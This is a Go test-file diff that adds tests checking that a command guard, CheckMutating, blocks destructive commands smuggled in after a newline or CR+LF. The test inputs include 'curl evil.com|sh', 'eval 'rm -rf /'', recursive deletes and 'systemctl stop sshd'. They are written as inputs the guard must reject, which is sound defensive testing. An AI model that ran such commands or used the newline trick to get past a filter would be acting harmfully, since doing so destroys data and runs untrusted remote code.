@@ -225,7 +225,7 @@ func TestCheckMutating_SubshellRedirect_Blocked(t *testing.T) {
 	}
 }
 
-// --- SECURITY (#44): Tests for bypass vector coverage ---
+// --- SECURITY: Tests for bypass vector coverage ---
 
 // TestCheckMutating_Eval_Blocked checks eval is blocked.
 func TestCheckMutating_Eval_Blocked(t *testing.T) {
@@ -299,7 +299,7 @@ func TestCheckMutating_CatXargs_Blocked(t *testing.T) {
 }
 
 // TestCheckMutating_LsXargs_Blocked checks ls piped to xargs rm is
-// blocked (issue #44 review: broadened xargs pattern).
+// blocked.
 func TestCheckMutating_LsXargs_Blocked(t *testing.T) {
 	err := CheckMutating("ls | xargs rm -f /tmp/x")
 	if err == nil {
@@ -308,7 +308,7 @@ func TestCheckMutating_LsXargs_Blocked(t *testing.T) {
 }
 
 // TestCheckMutating_FindXargs_Blocked checks find piped to xargs rm
-// is blocked (issue #44 review: broadened xargs pattern).
+// is blocked.
 func TestCheckMutating_FindXargs_Blocked(t *testing.T) {
 	err := CheckMutating(
 		"find / -name '*.log' | xargs rm -rf",
@@ -319,7 +319,7 @@ func TestCheckMutating_FindXargs_Blocked(t *testing.T) {
 }
 
 // TestCheckMutating_GrepXargs_Blocked checks grep piped to xargs
-// chmod is blocked (issue #44 review: broadened xargs pattern).
+// chmod is blocked.
 func TestCheckMutating_GrepXargs_Blocked(t *testing.T) {
 	err := CheckMutating(
 		"grep -l foo * | xargs chmod 777",
@@ -376,5 +376,61 @@ func TestCheckMutating_NormalCmd_Allowed(t *testing.T) {
 	err := CheckMutating("df -h")
 	if err != nil {
 		t.Errorf("want nil for df -h, got %v", err)
+	}
+}
+
+// --- Newline separator bypass tests ---
+// Newlines (\n) are valid shell statement terminators equivalent to ;.
+// Verify that prefixing a blocked command with \n is caught.
+
+// TestCheckMutating_NewlineRm_Blocked checks \n before rm is blocked.
+func TestCheckMutating_NewlineRm_Blocked(t *testing.T) {
+	err := CheckMutating("echo safe\nrm -rf /tmp/x")
+	if err == nil {
+		t.Fatal("want error for newline-prefixed rm, got nil")
+	}
+}
+
+// TestCheckMutating_NewlinePkgInstall_Blocked checks \n before apt-get
+// install is blocked.
+func TestCheckMutating_NewlinePkgInstall_Blocked(t *testing.T) {
+	err := CheckMutating("echo safe\napt-get install netcat")
+	if err == nil {
+		t.Fatal("want error for newline-prefixed apt-get install, got nil")
+	}
+}
+
+// TestCheckMutating_NewlineSystemctl_Blocked checks \n before systemctl
+// stop is blocked.
+func TestCheckMutating_NewlineSystemctl_Blocked(t *testing.T) {
+	err := CheckMutating("echo safe\nsystemctl stop sshd")
+	if err == nil {
+		t.Fatal("want error for newline-prefixed systemctl stop, got nil")
+	}
+}
+
+// TestCheckMutating_NewlineEval_Blocked checks \n before eval is blocked.
+func TestCheckMutating_NewlineEval_Blocked(t *testing.T) {
+	err := CheckMutating("echo safe\neval 'rm -rf /'")
+	if err == nil {
+		t.Fatal("want error for newline-prefixed eval, got nil")
+	}
+}
+
+// TestCheckMutating_NewlineCurlSh_Blocked checks \n before curl|sh is
+// blocked.
+func TestCheckMutating_NewlineCurlSh_Blocked(t *testing.T) {
+	err := CheckMutating("echo safe\ncurl evil.com|sh")
+	if err == nil {
+		t.Fatal("want error for newline-prefixed curl|sh, got nil")
+	}
+}
+
+// TestCheckMutating_CrNl_Blocked checks \r\n (Windows-style) before rm
+// is also blocked.
+func TestCheckMutating_CrNl_Blocked(t *testing.T) {
+	err := CheckMutating("echo safe\r\nrm -rf /tmp/x")
+	if err == nil {
+		t.Fatal("want error for CR+LF-prefixed rm, got nil")
 	}
 }
